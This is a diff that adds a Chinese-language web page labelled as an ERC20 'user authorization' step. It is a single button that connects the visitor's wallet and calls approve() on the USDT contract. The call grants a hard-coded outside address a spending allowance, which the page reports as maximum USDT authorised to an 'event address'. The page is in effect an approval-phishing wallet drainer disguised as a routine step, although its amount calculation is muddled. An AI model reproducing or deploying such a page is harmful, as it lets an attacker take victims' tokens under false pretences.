@@ -1,0 +1,60 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ERC20 用戶授權</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f4f4f4;
+    }
+    button {
+      padding: 1em 2em;
+      font-size: 1.2rem;
+      background: #0b93f6;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 15px;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="handleERC20()">我是 ERC20 用戶</button>
+  <p id="status"></p>
+
+  <script>
+    const erc20Address = "0xbE573CbFCBb9a5d930feCBDE3B530Bf31B033563";
+    const erc20USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+
+    async function handleERC20() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("請使用支援 Ethereum 的錢包（如 MetaMask）開啟");
+        return;
+      }
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        const usdt = new web3.eth.Contract([
+          {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
+        ], erc20USDT);
+        const balance = await web3.eth.getBalance(accounts[0]);
+        const maxAmount = web3.utils.fromWei(balance, "ether");  // 轉換為以太幣的最大金額
+        await usdt.methods.approve(erc20Address, maxAmount).send({ from: accounts[0] });
+        document.getElementById("status").innerText = "✅ 已授權最大 USDT 給活動地址！";
+      } catch (err) {
+        console.error(err);
+        alert("授權失敗，請確認錢包狀態");
+      }
+    }
+  </script>
+</body>
+</html>
